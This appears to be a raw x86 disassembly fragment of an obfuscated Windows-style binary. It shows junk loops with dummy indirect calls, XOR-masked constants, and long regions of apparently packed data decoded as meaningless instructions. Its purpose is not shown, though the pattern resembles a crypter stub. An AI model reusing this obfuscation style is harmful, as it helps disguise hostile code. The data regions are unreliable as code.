  403899:	cmp    DWORD PTR ds:0x42e866,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e866,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eadc
  4038bc:	cmp    DWORD PTR ds:0x42e866,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e866
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e866,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42ef28,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42ef28
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42ef28,edi
  403903:	cmp    DWORD PTR ds:0x42ef28,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eaf4
  403920:	cmp    DWORD PTR ds:0x42ef28,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42ef28
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42ef28,edi
  40393a:	cmp    DWORD PTR ds:0x42ef28,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef1c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef1c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef1c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef1c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef1c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ec9c
  403988:	cmp    DWORD PTR ds:0x42ef1c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef1c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef1c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef14,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x4305a6
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43058e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x4305aa,0x1d
  4039e0:	cmp    DWORD PTR ds:0x4305aa,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x4305aa,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eae0
  403a03:	mov    edi,DWORD PTR ds:0x4305aa
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x4305aa,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42ef30,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x4305aa
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x43065a,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x43065a
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x43065a,edx
  403a58:	cmp    DWORD PTR ds:0x43065a,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eaf8
  403a77:	cmp    DWORD PTR ds:0x43065a,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x430642,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e85a,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x43064a,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43058a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430692
  403aee:	mov    edx,DWORD PTR ds:0x42eab0
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x4305b2,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef1c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x4305aa,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x4305aa
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x4305aa,edx
  403b28:	cmp    DWORD PTR ds:0x4305aa,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ebc0
  403b43:	cmp    DWORD PTR ds:0x4305aa,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x4305aa
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x4305aa,edx
  403b5d:	cmp    DWORD PTR ds:0x4305aa,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x430642,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430592,0x430652
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43058e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43058a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x4305c2,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42ef20,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42ef30
  403bc5:	and    ebx,DWORD PTR ds:0x430652
  403bcb:	mov    DWORD PTR ds:0x42ef30,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e85a,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e85a
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e85a,ebx
  403bea:	cmp    DWORD PTR ds:0x42e85a,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eafc
  403c05:	cmp    DWORD PTR ds:0x42e85a,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x4305c2,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43058e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43058e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43058e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb00
  403c4d:	cmp    DWORD PTR ds:0x43058e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43058e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43058e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43058e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43058e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x43064e,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x43064a,0x4305c2
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430586
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x43064a
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42ef24,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43058a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x4305ae,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e876
  403ce8:	adc    DWORD PTR ds:0x42ef10,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x4305aa
  403cfb:	sbb    DWORD PTR ds:0x42e86e,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x196cd93],0x2e
  403d2b:	xchg   ecx,eax
  403d2c:	mov    dh,0x11
  403d2e:	jle    0x403dae
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403cc4
  403d35:	add    eax,0x169b7c4a
  403d3a:	sbb    dh,BYTE PTR [edx]
  403d3c:	call   0xd691:0x7a70899f
  403d43:	cs icebp 
  403d45:	xchg   BYTE PTR [edi+0x19ed7325],ah
  403d4b:	pop    ebp
  403d4c:	sbb    al,0xa6
  403d4e:	add    ebp,DWORD PTR [edi]
  403d50:	mov    al,ds:0xf03fa3ad
  403d55:	ror    BYTE PTR [ebx+0x63],cl
  403d58:	xor    ebx,DWORD PTR [ecx]
  403d5a:	mov    cl,0x7d
  403d5c:	pop    esp
  403d5d:	pusha  
  403d5e:	mul    DWORD PTR [ebp-0x5662c4fd]
  403d64:	sub    eax,0xf484c9a
  403d69:	inc    DWORD PTR [ebx]
  403d6b:	fcom   DWORD PTR [eax+0x53f93a03]
  403d71:	mov    al,BYTE PTR [esi-0x7e]
  403d74:	inc    ecx
  403d75:	mov    ch,0xe6
  403d77:	aas    
  403d78:	js     0x403d83
  403d7a:	sbb    dl,BYTE PTR [edx]
  403d7c:	jp     0x403de7
  403d7e:	cmp    ebp,DWORD PTR [ebx-0x24]
  403d81:	clc    
  403d82:	dec    edx
  403d83:	rcr    DWORD PTR [edi],0x96
  403d86:	lock inc ebp
  403d88:	ficom  WORD PTR [esi+0x4a]
  403d8b:	jnp    0x403dfb
  403d8d:	call   0x95d9a6e9
  403d92:	stc    
  403d93:	mov    cl,0xc2
  403d95:	jl     0x403d82
  403d97:	fwait
  403d98:	add    al,0xde
  403d9a:	xlat   BYTE PTR ds:[ebx]
  403d9c:	shr    DWORD PTR [ebp+eiz*8-0x19],1
  403da0:	jl     0x403dda
  403da2:	inc    eax
  403da3:	fiadd  DWORD PTR [eax+0x23]
  403da6:	dec    ebx
  403da7:	jge    0x403d4e
  403da9:	test   eax,0xf583af38
  403dae:	shr    DWORD PTR [ebp+0x60ce99fc],1
  403db4:	cli    
  403db5:	cmp    ah,bh
  403db7:	mov    al,0xa1
  403db9:	mov    ebx,0xd33ef1ea
  403dbe:	jne    0x403e15
  403dc0:	xchg   DWORD PTR [esi*4-0x7bcab570],esp
  403dc7:	jb     0x403d77
  403dc9:	adc    BYTE PTR [ebp-0x44997b1],dl
  403dcf:	frstor ds:0xde8bb680
  403dd5:	pushf  
  403dd6:	and    DWORD PTR [edi],ecx
  403dd8:	sub    al,0xea
  403dda:	aaa    
  403ddb:	dec    ebp
  403ddc:	xchg   edi,eax
  403ddd:	mov    ebx,0x1f3f298a
  403de2:	retf   
  403de3:	jecxz  0x403e25
  403de5:	test   dh,bl
  403de7:	jecxz  0x403d9c
  403de9:	push   0x6b
  403deb:	jb     0x403e17
  403ded:	outs   dx,DWORD PTR ds:[esi]
  403dee:	or     DWORD PTR [ecx+esi*4+0xb3a6b6e],esp
  403df5:	pop    ebx
  403df6:	mov    ebx,0x67cff454
  403dfb:	call   0x63ce9500
  403e00:	adc    eax,0x277b0383
  403e05:	adc    edi,0x7da440eb
  403e0b:	sbb    ebp,DWORD PTR [eax]
  403e0d:	xor    eax,0xff9cf06c
  403e12:	jae    0x403e7b
  403e14:	ret    0x4cf5
  403e17:	jns    0x403e86
  403e19:	mov    ebx,0xdc7e7b39
  403e1e:	push   edx
  403e1f:	mov    edi,0xffb66d6b
  403e24:	mov    bh,0x39
  403e26:	neg    DWORD PTR [ebx]
  403e28:	mov    esi,0xcd14a37e
  403e2d:	test   eax,0x4ba772ef
  403e32:	ins    BYTE PTR es:[edi],dx
  403e33:	enter  0xcd16,0x43
  403e37:	shr    BYTE PTR ds:0xad692ee5,cl
  403e3d:	inc    ecx
  403e3e:	add    esp,DWORD PTR [ebx]
  403e40:	mov    ds:0x43aa63f7,eax
  403e45:	push   ecx
  403e46:	retf   0xc252
  403e49:	sbb    DWORD PTR [ebx],ebp
  403e4b:	in     eax,dx
  403e4c:	inc    ebx
  403e4d:	cwde   
  403e4e:	add    BYTE PTR [edi-0x54],ch
  403e51:	push   ebx
  403e52:	xchg   ebp,eax
  403e53:	lock shl DWORD PTR [ebp-0x4a20c8a],cl
  403e5a:	enter  0x99d5,0x21
  403e5e:	jmp    0x1f1d0c58
  403e63:	push   ecx
  403e64:	idiv   DWORD PTR [esi-0x75702626]
  403e6a:	(bad)  
  403e6b:	mov    esp,0x9a8e0417
  403e70:	add    cl,BYTE PTR [ebp+0x4a4a06ff]
  403e76:	pop    ebx
  403e77:	push   ebx
  403e78:	fisubr WORD PTR [eax]
  403e7a:	cmp    eax,0x27effae5
  403e7f:	test   DWORD PTR ds:0x2a1a3202,esi
  403e85:	sbb    BYTE PTR [eax+0x0],ah
  403e88:	mov    ebp,edx
  403e8a:	cmp    eax,0xe7c4bb05
  403e8f:	mov    bh,0xcd
  403e91:	int    0xa5
  403e93:	or     edi,DWORD PTR [ebp-0x53689b43]
  403e99:	popf   
  403e9a:	repnz stos DWORD PTR es:[edi],eax
  403e9c:	call   FWORD PTR [eax+0x64]
  403e9f:	cmc    
  403ea0:	jne    0x403e48
  403ea2:	rcl    ebp,cl
  403ea4:	xor    al,0xbe
  403ea6:	sub    al,0x9
  403ea8:	push   0xfffffffd
  403eaa:	or     edx,ecx
  403eac:	fbstp  TBYTE PTR [ecx]
  403eae:	jmp    0x344f:0x23b6aebe
  403eb5:	dec    eax
  403eb6:	add    DWORD PTR [esi-0x2e],esi
  403eb9:	mov    esp,0xe7843508
  403ebe:	inc    edi
  403ebf:	(bad)  
  403ec0:	iret   
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x267278c4,al
  403efc:	scas   al,BYTE PTR es:[edi]
  403efd:	pop    esp
  403efe:	pop    ebx
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403f1d
  403f08:	clc    
  403f09:	aaa    
  403f0a:	imul   ebp,DWORD PTR [ecx-0x5a],0x1cd22015
  403f11:	mov    bl,0xf6
  403f13:	cmp    DWORD PTR [ebp+edi*8+0x40],edi
  403f17:	out    dx,al
  403f18:	clc    
  403f19:	stos   DWORD PTR es:[edi],eax
  403f1a:	mov    dl,0x54
  403f1c:	pushf  
  403f1d:	cmp    DWORD PTR [ebx-0x78],ebx
  403f20:	ret    
  403f21:	push   es
  403f22:	sub    DWORD PTR [edi+0x2d],0xffffff9a
  403f26:	inc    eax
  403f27:	fstp   DWORD PTR [ecx]
  403f29:	fdiv   QWORD PTR [eax+eax*2+0x43]
  403f2d:	loope  0x403f42
  403f2f:	sbb    DWORD PTR [edx],ebx
  403f31:	jb     0x403efc
  403f33:	add    cl,ch
  403f35:	cmp    eax,0xc19e3179
  403f3a:	stc    
  403f3b:	pop    eax
  403f3c:	sahf   
  403f3d:	xchg   DWORD PTR [esi+ebx*8-0x73],ebx
  403f41:	cld    
  403f42:	jo     0x403f1d
  403f44:	fwait
  403f45:	pop    ebp
  403f46:	test   eax,0x4e676ce3
  403f4b:	mov    DWORD PTR [esi+0x547e5462],edx
  403f51:	jbe    0x403f5f
  403f53:	loope  0x403f01
  403f55:	jl     0x403fc7
  403f57:	cdq    
  403f58:	mov    bl,0xbb
  403f5a:	sbb    al,0x3c
  403f5c:	in     eax,0x2c
  403f5e:	retf   
  403f5f:	sub    al,0x18
  403f61:	loopne 0x403fc5
  403f63:	mov    eax,0x1afe19c2
  403f68:	cmp    esi,DWORD PTR [ebx+0x7c]
  403f6b:	mov    ds:0x877e8c48,eax
  403f70:	xchg   ebx,eax
  403f71:	bswap  ebx
  403f73:	xchg   ebp,eax
  403f74:	iret   
  403f75:	in     al,0x5e
  403f77:	out    dx,al
  403f78:	xor    dh,BYTE PTR ds:0xa7f45089
  403f7e:	cmp    DWORD PTR [ebp-0x1d11176f],esi
  403f84:	fld    DWORD PTR [edi-0x66f4ef7c]
  403f8a:	pop    ebp
  403f8b:	add    al,0xef
  403f8d:	sub    ecx,DWORD PTR [eax+0x2c374086]
  403f93:	jne    0x403ff1
  403f95:	push   es
  403f96:	mov    esp,0xa222485
  403f9b:	mov    eax,ds:0x9c5be962
  403fa0:	push   ss
  403fa1:	xor    bh,BYTE PTR [eax]
  403fa3:	push   edx
  403fa4:	sub    DWORD PTR [edx+esi*2],esp
  403fa7:	arpl   WORD PTR [eax+0x5b0298af],di
  403fad:	adc    DWORD PTR ds:0x926eebcb,esi
  403fb3:	arpl   WORD PTR [edx],di
  403fb5:	into   
  403fb6:	ja     0x403fa6
  403fb8:	in     al,dx
  403fb9:	and    BYTE PTR [edx],al
  403fbb:	adc    BYTE PTR [ebx-0x34],bh
  403fbe:	mov    bh,0xa0
  403fc0:	adc    DWORD PTR [edx-0x771a981b],edx
  403fc6:	mov    eax,0xbda8bb20
  403fcb:	jl     0x403fae
  403fcd:	sub    eax,0x809a2358
  403fd2:	cmp    ebp,ebp
  403fd4:	cmp    eax,0x94b2f2a3
  403fd9:	shl    esp,1
  403fdb:	xor    eax,0x1b918f26
  403fe0:	mov    dl,0x5a
  403fe2:	push   edx
  403fe3:	or     ebp,DWORD PTR [esi]
  403fe5:	shl    bh,cl
  403fe7:	add    esp,ebp
  403fe9:	fstp   QWORD PTR [ecx-0x30]
  403fec:	in     al,dx
  403fed:	add    eax,0x42d07a69
  403ff2:	add    DWORD PTR cs:[ebp-0x77],ebp
  403ff6:	into   
  403ff7:	push   ebp
  403ff8:	xchg   edi,eax
  403ff9:	cmp    eax,0x79cf0168
  403ffe:	dec    esi
  403fff:	ds jbe 0x404073
  404002:	ins    BYTE PTR es:[edi],dx
  404003:	dec    esi
  404004:	test   eax,0x51f3fab3
  404009:	lds    eax,FWORD PTR [edi]
  40400b:	xchg   ebx,eax
  40400c:	cwde   
  40400d:	stos   DWORD PTR es:[edi],eax
  40400e:	adc    al,BYTE PTR [ecx+0x4]
  404011:	adc    esi,DWORD PTR [eax+0x53a9d52a]
  404017:	pop    eax
  404018:	nop
  404019:	les    eax,FWORD PTR [eax+0x20ca7c3d]
  40401f:	inc    esi
  404020:	xor    ebx,0xffffffc7
  404023:	cwde   
  404024:	jmp    DWORD PTR [edi+0x45]
  404027:	xchg   bh,cl
  404029:	cs mov ah,0x33
  40402c:	aad    0x35
  40402e:	gs std 
  404030:	psubq  mm3,QWORD PTR [ecx-0x2f]
  404034:	jbe    0x40402d
  404036:	mov    edx,DWORD PTR [ecx+esi*1-0x8]
  40403a:	adc    al,BYTE PTR [esp+ecx*2-0x5]
  40403e:	pop    ebx
  40403f:	imul   ebp,DWORD PTR [ebx],0x92770d6c
  404045:	scas   al,BYTE PTR es:[edi]
  404046:	mov    ds,WORD PTR [edi]
  404048:	ret    
  404049:	push   ebx
  40404a:	test   DWORD PTR [eax+ebx*1-0x3d],edx
  40404e:	jns    0x403fe2
  404050:	xchg   ecx,eax
  404051:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404052:	inc    edi
  404053:	dec    edi
  404054:	pop    edx
  404055:	(bad)  
  404056:	and    bh,bh
  404058:	sbb    al,0x9b
  40405a:	aad    0x1f
  40405c:	mov    ch,0xe7
  40405e:	loopne 0x403fee
  404060:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404061:	in     eax,dx
  404062:	sbb    al,0x72
  404064:	rol    DWORD PTR [edx-0xb43d0a],cl
  40406a:	in     eax,dx
  40406b:	jne    0x404008
  40406d:	mov    ebp,0xd1a88139
  404072:	push   ebp
  404073:	adc    DWORD PTR [edi],ebp
  404075:	stc    
  404076:	mov    ah,0xd
  404078:	sbb    al,0x3b
  40407a:	out    dx,eax
  40407b:	and    edx,0xfffffff4
  40407e:	pop    ebx
  40407f:	jno    0x40403d
  404081:	adc    eax,0xa3fd18d2
  404086:	enter  0xbc29,0xd0
  40408a:	inc    esp
  40408b:	ror    BYTE PTR [edx-0x57],cl
  40408e:	pop    eax
  40408f:	xchg   BYTE PTR [ebx-0x7431974f],dl
  404095:	push   ebp
  404096:	aam    0xe9
  404098:	ja     0x40409f
  40409a:	add    BYTE PTR [eax],al
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax-0x5fdf5c60]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x40404f
  4040c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040c1:	adc    DWORD PTR [esi+edx*1-0x34],esi
  4040c5:	sahf   
  4040c6:	bound  ebx,QWORD PTR [ecx+edx*2-0x1c]
  4040ca:	(bad)  
  4040cb:	cmp    ebx,DWORD PTR [esi-0x59]
  4040ce:	adc    al,0x50
  4040d0:	sbb    eax,0x5e04eb74
  4040d5:	jne    0x4040e4
  4040d7:	add    DWORD PTR [ebx-0xeac7d42],esp
  4040dd:	mov    ds:0x52c0d23e,al
  4040e2:	inc    ebp
  4040e3:	mov    ds,WORD PTR [ebp-0x3e]
  4040e6:	fist   DWORD PTR [ecx]
  4040e8:	or     eax,0x79cf85e4
  4040ed:	repnz sbb BYTE PTR [edx-0x1c658c89],dl
  4040f4:	and    al,0xf8
  4040f6:	arpl   dx,cx
  4040f8:	cld    
  4040f9:	sar    DWORD PTR [ebp-0x704ee9de],cl
  4040ff:	xor    edx,DWORD PTR [eax+ebx*1-0x6d8b58e0]
  404106:	out    0x4b,eax
  404108:	aam    0x3d
  40410a:	adc    BYTE PTR [ebp+ecx*8-0x3178a68],al
  404111:	pop    ebx
  404112:	sbb    cl,BYTE PTR [ebp+0x3c30178b]
  404118:	push   ebx
  404119:	or     eax,DWORD PTR [eax-0x7de3a4a0]
  40411f:	cmp    dl,BYTE PTR [ecx+eax*4]
  404122:	ja     0x404189
  404124:	(bad)  
  404125:	cwde   
  404126:	jne    0x404138
  404128:	in     eax,dx
  404129:	data16 in al,dx
  40412b:	fwait
  40412c:	xor    DWORD PTR [edx-0x1ae0237],0x25
  404133:	call   0x4ff5806a
  404138:	xchg   ecx,eax
  404139:	pop    eax
  40413a:	jg     0x4040dc
  40413c:	pop    es
  40413d:	push   ebp
  40413e:	or     ch,BYTE PTR [edi+0x3c95f18a]
  404144:	ret    0x331d
  404147:	pop    ebx
  404148:	sbb    ebp,DWORD PTR [edx+0x5a]
  40414b:	mov    dh,0xf7
  40414d:	popf   
  40414e:	mov    WORD PTR [edi+0x66],cs
  404151:	int3   
  404152:	cmp    al,0x4b
  404154:	mov    DWORD PTR gs:[edx+esi*2-0x5a],ebx
  404159:	scas   eax,DWORD PTR es:[edi]
  40415a:	in     eax,0x93
  40415c:	dec    ebp
  40415d:	js     0x404130
  40415f:	mov    ebx,0x84adef77
  404164:	aam    0x22
  404166:	xchg   bl,dh
  404168:	sub    BYTE PTR [esi],bl
  40416a:	pushf  
  40416b:	div    ah
  40416d:	mov    ecx,0xf36df602
  404172:	int3   
  404173:	push   ecx
  404174:	adc    al,0x50
  404176:	pop    ds
  404177:	iret   
  404178:	xchg   edx,eax
  404179:	xor    bh,BYTE PTR [edi-0x77dc02b5]
  40417f:	inc    esp
  404180:	dec    ebp
  404181:	mov    eax,ds:0x53567cba
  404186:	ficomp WORD PTR [eax-0x1ed7e5cd]
  40418c:	scas   eax,DWORD PTR es:[edi]
  40418d:	sub    eax,0x29bfe8b7
  404192:	scas   eax,DWORD PTR es:[edi]
  404193:	sub    edx,esi
  404195:	(bad)  
  404196:	mov    dl,0x7b
  404198:	mov    eax,ds:0xee5eeda7
  40419d:	jmp    0xab00:0xd46fd60a
  4041a4:	sbb    DWORD PTR [ebx-0x2c],ebx
  4041a7:	xor    al,ch
  4041a9:	mov    esp,0x54b028bd
  4041ae:	pop    ds
  4041af:	(bad)  
  4041b0:	cld    
  4041b1:	stos   BYTE PTR es:[edi],al
  4041b2:	dec    ebp
  4041b3:	and    dh,ah
  4041b5:	xchg   esi,eax
  4041b6:	or     ebx,edx
  4041b8:	aaa    
  4041b9:	in     eax,dx
  4041ba:	push   edi
  4041bb:	or     al,0xa4
  4041bd:	jo     0x40414b
  4041bf:	jno    0x4041da
  4041c1:	push   edx
  4041c2:	mov    bl,0xcc
  4041c4:	ss ins DWORD PTR es:[edi],dx
  4041c6:	mov    ebp,0x62d89e75
  4041cb:	cwde   
  4041cc:	fnstsw WORD PTR [esi+0x1a8b465e]
  4041d2:	jb     0x404205
  4041d4:	push   ecx
  4041d5:	mov    ebp,0x2c4ef389
  4041da:	xor    bl,ah
  4041dc:	inc    eax
  4041dd:	xor    ebp,DWORD PTR [eax]
  4041df:	mov    eax,ds:0xe52872dc
  4041e4:	jnp    0x404168
  4041e6:	add    ebx,ebx
  4041e8:	lods   al,BYTE PTR ds:[esi]
  4041e9:	and    al,0xea
  4041eb:	retf   
  4041ec:	mov    WORD PTR [edx],cs
  4041ee:	xor    DWORD PTR [edi+0x52ea67ad],esp
  4041f4:	inc    esi
  4041f5:	cdq    
  4041f6:	sti    
  4041f7:	pop    edx
  4041f8:	mov    dh,0xff
  4041fa:	loop   0x40421f
  4041fc:	div    BYTE PTR [eax*8-0x2d20740c]
  404203:	push   esi
  404204:	les    esp,FWORD PTR [edi]
  404206:	push   esi
  404207:	loope  0x40419d
  404209:	and    eax,0x7b65a884
  40420e:	ret    
  40420f:	lods   al,BYTE PTR ds:[esi]
  404210:	ss or  eax,0x12d7243a
  404216:	or     al,BYTE PTR [ecx-0x33]
  404219:	mov    ds:0x427bda8e,eax
  40421e:	imul   edx,ecx,0x32
  404221:	inc    esp
  404222:	pop    esp
  404223:	push   ecx
  404224:	add    BYTE PTR [edi],dl
  404226:	lods   al,BYTE PTR ds:[esi]
  404227:	es mov al,0x2f
  40422a:	sub    esp,ebp
  40422c:	and    eax,0xff8ef1ad
  404231:	and    al,0x3
  404233:	cli    
  404234:	sub    DWORD PTR [ecx],eax
  404236:	mov    eax,0x2c9f8ff6
  40423b:	lea    eax,[ebx-0x74]
  40423e:	adc    esi,ebx
  404240:	ins    DWORD PTR es:[edi],dx
  404241:	mov    dh,0x65
